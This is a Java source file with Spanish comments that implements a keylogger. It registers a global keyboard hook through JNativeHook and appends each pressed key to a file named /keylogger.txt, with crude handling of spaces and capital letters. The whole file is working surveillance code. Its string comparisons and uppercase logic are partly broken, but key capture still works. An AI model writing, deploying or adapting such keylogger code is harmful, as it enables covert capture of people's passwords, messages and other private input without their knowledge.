import java.io.FileNotFoundException;
import java.io.FileOutputStream;
import java.io.FileWriter;
import java.io.IOException;
import java.nio.file.Path;

import org.jnativehook.GlobalScreen;
import org.jnativehook.keyboard.NativeKeyEvent;
import org.jnativehook.keyboard.NativeKeyListener;

/*Primero se implementará la interfaz que contiene los métodos necesarios para el
 * manejo de las teclas según su comportamiento
 */

public class Main implements NativeKeyListener {
	String mayuscula="no";

	public static void main(String[] args) {
		
		//Se inicia la rutina de inicialización de los componentes de la librería JNativeHook
		try {
			GlobalScreen.registerNativeHook();
		} catch(Exception e) {
			e.printStackTrace();
		}
		
		/*Es necesario decirle a la instancia de GlobalScreen que se agregará un Listener,
		 * ya que la clase Main implementa la interfaz del Listener sólo se crea una instancia
		 * de dicha clase para colocarla como argumento:
		*/
		GlobalScreen.getInstance().addNativeKeyListener(new Main());
	}

	//El método que se utilizará por ahora es nativeKeyPressed:
	@Override
	public void nativeKeyPressed(NativeKeyEvent e) {
		try {
				
			FileWriter out = new FileWriter("/keylogger.txt", true);	
			/* en la primera condicionar aberiguamos si trae el tag Espacio si la trae procedemos a dejar el espacio*/
			if(NativeKeyEvent.getKeyText(e.getKeyCode()).toString()=="Espacio" ){
				//System.out.print(" ");
				String space=" ";
					for(int i=0;i<=space.length()-1;i++)
					{
						out.write(space.charAt(i));
					}
				out.close();

			
				}
				else{	/*si no existe caracter espacion procedemos a verificar si la palabra va en minuscula o en mayuscula*/
				
					String phase=NativeKeyEvent.getKeyText(e.getKeyCode());
				/*asignamos la variable y buscamos aver si viene el tag mayuscula si biene colocamos en la palabra de escritura del fichero "" */
					if(phase=="Mayús" || ((phase.length()>1)&&phase!="Mayús")) //modificar para ver todo lo que se escribe
					{
						phase="";
						
							if(phase=="Mayús")
							{
								mayuscula="si";
							}				
					}
					else{
						
						/*si no se cumple la condicion entoces miramos si ubo anteriormente algun tag mayuscula y si lo ubo escribmos como viene en la libreria
					 		* JnativeHook */
							if(mayuscula=="si"){
							mayuscula="no";		
							phase=NativeKeyEvent.getKeyText(e.getKeyCode());
							}else{ // si esto es falso entonce lo combertimos en Minuscula
								phase=phase.toLowerCase();
							}
							
						}
						
					

						// por ultimo escribimos el texto en el fichero
							for(int i=0;i<=phase.length()-1;i++)
							{
								out.write(phase.charAt(i));
							}
							out.close();
						
					}
	} catch (IOException e1) {
					// TODO Auto-generated catch block
					e1.printStackTrace();
		}

		
		
	}

	@Override
	public void nativeKeyReleased(NativeKeyEvent e) {
		// TODO Auto-generated method stub
		
	}

	@Override
	public void nativeKeyTyped(NativeKeyEvent e) {
		// TODO Auto-generated method stub
	}
	
}

